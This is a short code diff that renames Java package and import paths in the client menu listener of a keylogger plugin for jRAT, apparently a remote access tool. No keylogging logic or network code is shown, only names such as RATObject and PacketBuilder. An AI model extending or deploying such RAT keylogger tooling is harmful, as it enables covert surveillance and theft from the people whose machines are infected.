@@ -1,4 +1,4 @@
-package pro.jrat.plugin.keylogger.client;
+package io.jrat.plugin.keylogger.client;
 
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
@@ -9,10 +9,10 @@ import java.util.List;
 import javax.swing.ImageIcon;
 import javax.swing.JFrame;
 
-import pro.jrat.api.BaseControlPanel;
-import pro.jrat.api.PacketBuilder;
-import pro.jrat.api.RATMenuItemActionListener;
-import pro.jrat.api.RATObject;
+import jrat.api.BaseControlPanel;
+import jrat.api.PacketBuilder;
+import jrat.api.RATMenuItemActionListener;
+import jrat.api.RATObject;
 
 public class MenuListener implements RATMenuItemActionListener {
 
